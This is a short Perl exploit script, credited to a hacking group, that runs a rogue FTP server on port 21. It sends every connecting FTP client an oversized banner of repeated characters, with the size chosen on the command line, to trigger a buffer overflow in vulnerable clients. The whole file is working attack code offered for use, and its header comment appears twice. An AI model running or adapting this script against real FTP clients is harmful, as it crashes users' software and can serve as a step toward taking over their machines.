#!/usr/bin/perl
########################################################
#
# Banner Buffer Overflow remote exploit in FTP Clients
#
#
#!/usr/bin/perl
########################################################
#
# Banner Buffer Overflow remote exploit in FTP Clients
#
#
#                by Over_G [DWC Gr0up]
#
#         www.dwcgr0up.com      www.overg.com
#########################################################
use IO::Socket;
$port = "21";
$data = "a";
$bsize = $ARGV[0];

print "\n  Banner Buffer Overflow remote exploit in FTP Clients\n\n";
print "           by Over G[DWC Gr0up]\n";
print "     www.dwcgr0up.com www.overg.com\n\n";

if (defined $bsize) {}
 else {
  print "Incorrect parameters.\n";
  die "Usage: perl ftpbanex.pl [buffer_size]\n";
}
print "Creating server...\n";
$buf .= $data x $bsize;
$server = IO::Socket::INET->new(LocalPort => $port, Type =>
SOCK_STREAM, Reuse => 1, Listen => 2)
or die "Couldn't create server.\n";
print "Awayting connections...\n";
while ($client = $server->accept())
{
 print "Client connected.\n";
 print "Attacking...";
 print $client "$buf";
 print "OK\n";
 close($client);
}
